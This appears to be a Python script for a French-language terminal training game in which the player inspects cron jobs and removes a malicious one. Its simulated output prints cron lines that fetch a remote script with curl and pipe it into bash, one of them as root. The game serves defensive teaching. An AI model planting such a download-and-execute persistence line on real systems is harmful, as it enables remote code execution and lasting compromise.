import random
import pyfiglet

def build_challenge_list(state):
    return [
        "",
        f"{'✅' if state[1] else '◻️'} 1) Exécuter 'crontab -l' pour afficher la crontab de l'utilisateur.",
        "",
        f"{'✅' if state[2] else '◻️'} 2) Exécuter 'cat /etc/crontab' pour afficher la crontab système.",
        "",
        f"{'✅' if state[3] else '◻️'} 3) Exécuter 'ls /etc/cron.d' pour lister les tâches planifiées.",
        "",
        f"{'✅' if state[4] else '◻️'} 4) Exécuter 'cat /etc/cron.d/pwn' pour inspecter la tâche suspecte.",
        "",
        f"{'✅' if state[5] else '◻️'} 5) Exécuter 'systemctl list-timers' pour vérifier les minuteries systemd.",
        "",
        f"{'✅' if state[6] else '◻️'} 6) Exécuter 'rm /etc/cron.d/pwn' pour supprimer la tâche malveillante.",
        "",
    ]

def print_help():
    print("=" * 60)
    print("   TERMINAL WARRIOR - AIDE DU NIVEAU 13 (TÂCHES PLANIFIÉES CRON)")
    print("=" * 60)
    print("")
    print(" OBJECTIF :")
    print("   Une tâche cron malveillante s'exécute toutes les 5 minutes (et un leurre")
    print("   chaque minute). Explorez les tâches planifiées et supprimez le fichier")
    print("   malveillant /etc/cron.d/pwn.")
    print("")
    print(" COMMANDES :")
    print(" help - Affiche ce menu d'aide")
    print(" challenge - Affiche les défis en cours")
    print(" exit - Quitte le terminal")
    print(" crontab -l - Affiche la crontab de l'utilisateur")
    print(" crontab -e - Édite la crontab de l'utilisateur")
    print(" crontab -r - Supprime la crontab de l'utilisateur")
    print(" cat /etc/crontab - Affiche la crontab système")
    print(" ls /etc/cron.d - Liste les tâches planifiées du système")
    print(" cat /etc/cron.d/<fichier> - Affiche le contenu d'une tâche")
    print(" systemctl list-timers - Affiche les minuteries systemd")
    print(" rm <fichier> - Supprime un fichier")
    print(" pwd - Affiche le répertoire courant (Print Working Directory)")
    print(" whoami - Affiche l'utilisateur courant")
    print("")
    print(" DÉROULÉ CONSEILLÉ :")
    print(" 1. 'crontab -l' : affiche la crontab de l'utilisateur (téléchargement toutes les 5 minutes).")
    print(" 2. 'cat /etc/crontab' : affiche la crontab système.")
    print(" 3. 'ls /etc/cron.d' : liste les tâches planifiées du système.")
    print(" 4. 'cat /etc/cron.d/pwn' : inspecte la tâche suspecte 'pwn' (exécution chaque minute).")
    print(" 5. 'systemctl list-timers' : vérifie les minuteries systemd (normales).")
    print(" 6. 'rm /etc/cron.d/pwn' : supprime la tâche malveillante.")
    print("")
    print(" ASTUCE : une entrée cron comme '*/5 * * * *' se répète toutes les 5 minutes ;")
    print("          dans /etc/cron.d, chaque fichier est un script de tâche — 'pwn' est l'intruse.")

def print_challenges(state):
    for line in build_challenge_list(state):
        print(line)

def main():
    challenge_state = {i: False for i in range(1, 7)}

    time1 = random.randint(1, 24)
    time2 = random.randint(10, 59)
    day = random.randint(1, 28)
    ip_parts = [str(random.randint(10, 100)) for _ in range(4)]
    ip_address = ".".join(ip_parts)

    ascii_banner = pyfiglet.figlet_format("TERMINALWARRIOR", font="slant")
    print(ascii_banner)
    print("\nBienvenue au niveau 13 (TÂCHES PLANIFIÉES CRON) réalisé par (TerminalWarrior)\n")
    print("Une tâche cron malveillante semble exécuter une commande toutes les 5 minutes.")
    print("Tapez 'help' et 'challenge' pour accéder au menu d'aide et consulter les défis.")
    input("Appuyez sur Entrée pour continuer...")
    print("")

    print_challenges(challenge_state)
    print("\nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-91-generic x86_64)\n")
    print("* Documentation: https://help.ubuntu.com")
    print("* Management:    https://landscape.canonical.com")
    print("* Support:       https://ubuntu.com/advantage\n")
    print(
        f"System information as of [Thu Oct {day} {time1:02d}:{time2:02d}:00 UTC 2025]\n")
    print("System load: 0.61               Processes:          312")
    print("Usage of /:   48.06% of 49.11GB  Users logged in:     1")
    print(
        f"Memory usage: 1380MB             IP address for eth0: {ip_address}")
    print("Swap usage:   0%\n")
    print("0 updates can be applied immediately.\n")
    print("Last Login: Thu Oct 3 12:00:00 UTC 2025\n")

    current_directory = "~"

    while True:
        prompt = f"user@linux:{current_directory}$ "
        command = input(prompt).strip()
        if not command:
            continue

        parts = command.split()
        cmd = parts[0]
        args = parts[1:]

        if cmd == "help":
            print_help()
            continue

        if cmd == "challenge":
            print()
            print_challenges(challenge_state)
            print()
            continue

        if cmd == "exit":
            print("Au revoir")
            break

        if cmd == "crontab":
            if len(args) < 1:
                print("Usage: crontab <-l|-e|-r>")
                continue
            opt = args[0]
            if opt == "-l":
                print("# crontab pour user")
                print("MAILTO=\"\"")
                print("*/5 * * * * /usr/bin/curl -s http://185.220.101.4/beacon.sh | bash")
                print("\nUne tâche toutes les 5 minutes télécharge et exécute un script : c'est malveillant !")
                if not challenge_state[1]:
                    challenge_state[1] = True
                    print("\nVous avez terminé le défi 1 ! Tapez 'challenge' pour voir votre progression.")
            elif opt == "-e":
                print("crontab: opened editor -- (simulation)")
                print("(Dans le jeu, la modification n'est pas persistée.)")
            elif opt == "-r":
                print("crontab: supprimée pour user.")
                print("SUCCESS: La crontab de l'utilisateur a été supprimée.")
            else:
                print(f"crontab: invalid option '{opt}'")
            continue

        if cmd == "cat":
            path = " ".join(args) if args else ""
            if path == "/etc/crontab":
                print("# /etc/crontab: environnement de la crontab système")
                print("PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin")
                print("17 *  * * *    root    cd / && run-parts --report /etc/cron.hourly")
                print("25 6  * * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )")
                print("47 6  * * 7    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )")
                print("52 6  1 * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )")
                if not challenge_state[2]:
                    challenge_state[2] = True
                    print("\nVous avez terminé le défi 2 ! Tapez 'challenge' pour voir votre progression.")
            elif path == "/etc/cron.d/pwn":
                print("* * * * * root /bin/sh -c 'curl -s http://185.220.101.4/beacon.sh | bash'")
                print("\nCette tâche s'exécute chaque minute avec les droits root : elle doit être supprimée !")
                if not challenge_state[4]:
                    challenge_state[4] = True
                    print("\nVous avez terminé le défi 4 ! Tapez 'challenge' pour voir votre progression.")
            elif path.startswith("/etc/cron"):
                print(f"cat: {path}: Is a directory")
            else:
                print(f"cat: {path}: No such file or directory")
            continue

        if cmd == "ls":
            path = " ".join(args) if args else ""
            if path == "/etc/cron.d":
                print("pwn   junit   popularity-contest   sysstat   wsl-swap")
                print("\nLa tâche 'pwn' ressemble à un leurre : inspectez-la !")
                if not challenge_state[3]:
                    challenge_state[3] = True
                    print("\nVous avez terminé le défi 3 ! Tapez 'challenge' pour voir votre progression.")
            elif path:
                print(f"ls: cannot access '{path}': No such file or directory")
            else:
                print("backup.tar.gz   notes.txt   .security.log   hidden_data.txt")
            continue

        if cmd == "systemctl" and len(args) >= 1 and args[0] == "list-timers":
            print("NEXT                        LEFT       LAST                        PASSED      UNIT                         ACTIVATES")
            print("Thu 2025-10-03 13:11:00 UTC 51min left Thu 2025-10-03 12:11:34 UTC 8min ago    apt-daily.timer             apt-daily.service")
            print("Thu 2025-10-03 18:17:00 UTC 5h 57min   Thu 2025-10-02 18:17:00 UTC 17h ago     apt-daily-upgrade.timer     apt-daily-upgrade.service")
            print("Thu 2025-10-03 20:37:32 UTC 8h 37min  Thu 2025-10-02 20:37:32 UTC 15h ago     sysstat-collect.timer       sysstat-collect.service")
            print("Thu 2025-10-04 08:00:00 UTC 20h       Thu 2025-10-03 08:00:00 UTC 4h ago      logrotate.timer             logrotate.service")
            print("\nLes minuteries système semblent normales — le problème vient de cron.")
            if not challenge_state[5]:
                challenge_state[5] = True
                print("\nVous avez terminé le défi 5 ! Tapez 'challenge' pour voir votre progression.")
            continue

        if cmd == "rm":
            path = " ".join(args) if args else ""
            if path == "/etc/cron.d/pwn":
                print("SUCCESS: La tâche malveillante /etc/cron.d/pwn a été supprimée.")
                if not challenge_state[6]:
                    challenge_state[6] = True
                    print("\nVous avez terminé le défi 6 ! Tapez 'challenge' pour voir votre progression.")
            elif path:
                print(f"rm: cannot remove '{path}': Permission denied")
            else:
                print("Usage: rm <fichier>")
            continue

        if cmd == "pwd":
            print("/home/user")
            continue

        if cmd == "whoami":
            print("user")
            continue

        print(f"{cmd}: command not found")

    return all(challenge_state.values())

if __name__ == "__main__":
    main()